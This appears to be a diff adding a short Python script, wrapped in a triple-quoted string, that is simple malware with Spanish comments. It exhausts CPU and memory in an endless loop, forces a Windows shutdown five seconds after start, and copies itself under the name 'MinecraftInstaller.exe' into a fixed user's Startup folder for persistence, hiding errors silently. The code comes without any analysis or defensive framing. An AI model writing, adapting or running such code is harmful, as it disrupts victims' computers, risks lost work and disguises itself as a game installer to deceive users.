@@ -1,0 +1,32 @@
+'''
+import os
+import subprocess
+import time
+import shutil
+import threading
+
+# 1. Carga intensiva de CPU y RAM
+def consumir_recursos():
+    while True:
+        a = [i ** 2 for i in range(1000000)]
+
+# 2. Apagado programado tras unos segundos
+def apagar_equipo():
+    time.sleep(5)
+    subprocess.call("shutdown /s /t 0", shell=True)
+
+# 3. Iniciar el apagado en un hilo separado
+hilo_apagado = threading.Thread(target=apagar_equipo)
+hilo_apagado.start()
+
+# 4. Crear persistencia con nombre de usuario fijo
+try:
+    ruta_origen = os.path.abspath("MinecraftInstaller.exe")
+    ruta_destino = "C:/Users/Julian/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/MinecraftInstaller.exe"
+    shutil.copyfile(ruta_origen, ruta_destino)
+except Exception as error:
+    pass
+
+# 5. Ejecutar función de carga
+consumir_recursos()
+'''
